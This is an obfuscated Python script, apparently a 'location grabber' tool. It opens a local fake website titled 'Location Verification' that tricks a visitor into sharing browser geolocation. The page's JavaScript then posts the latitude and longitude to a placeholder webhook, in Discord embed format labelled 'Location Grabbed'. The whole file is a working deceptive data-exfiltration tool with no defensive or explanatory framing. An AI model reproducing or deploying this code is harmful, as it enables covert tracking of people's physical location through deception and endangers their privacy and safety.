from http .server import BaseHTTPRequestHandler ,HTTPServer 
import webbrowser 
import threading 
hook ='webhookhere'
server =None 
class MyServer (BaseHTTPRequestHandler ):
    def do_GET (OO0O0OO0O0OO0000O ):
        OO0O0OO0O0OO0000O .send_response (200 )
        OO0O0OO0O0OO0000O .send_header ("Content-type","text/html")
        OO0O0OO0O0OO0000O .end_headers ()
        OOO00O000OO0O00OO =[b"<html>",b"<body>",b"<h1>Location Verification</h1>",b"<p>To continue, verify your location.</p>",b"<button onclick=\"sendLocation()\">Verify</button>",b"<p id=\"demo\"></p>",b"<script>",b"const x = document.getElementById(\"demo\");",b"function sendLocation() {",b"  if (navigator.geolocation) {",b"    navigator.geolocation.getCurrentPosition(postLocation);",b"  } else {",b"    x.innerHTML = \"Geolocation is not supported by this browser.\";",b"  }",b"}",b"function postLocation(position) {",b"    const latitude = position.coords.latitude;",b"    const longitude = position.coords.longitude;",b"    const data = {",b"        embeds: [{",b"            title: 'Location Grabbed',",b"            description: `Latitude: ${latitude}\nLongitude: ${longitude}`",b"        }]",b"    };",str .encode ("    fetch('"+hook +"', {"),b"        method: 'POST',",b"        headers: {",b"            'Content-Type': 'application/json',",b"        },",b"        body: JSON.stringify(data),",b"    });",b"    fetch('/close', { method: 'POST' });",b"}",b"</script>",b"</body>",b"</html>"]
        for O0O0OO0O0OO0O000O in OOO00O000OO0O00OO :
            OO0O0OO0O0OO0000O .wfile .write (O0O0OO0O0OO0O000O )
class MyHTTPServer (HTTPServer ):
    def run_server (OO00O000OO0OOOO0O ):
        OO00O000OO0OOOO0O .serve_forever ()
def fakewebsite ():
    global server 
    O0000O0O00O000OOO ="localhost"
    O0OO0O0O000OO0OO0 =8080 
    webbrowser .open (f"http://{O0000O0O00O000OOO}:{O0OO0O0O000OO0OO0}")
    server =MyHTTPServer ((O0000O0O00O000OOO ,O0OO0O0O000OO0OO0 ),MyServer )
    print (f"Server started http://{O0000O0O00O000OOO}:{O0OO0O0O000OO0OO0}")
    threading .Thread (target =server .run_server ).start ()
def close_server ():
    global server 
    if server :
        server .shutdown ()
        server .server_close ()
        print ("Server stopped.")
if __name__ =="__main__":
    fakewebsite ()
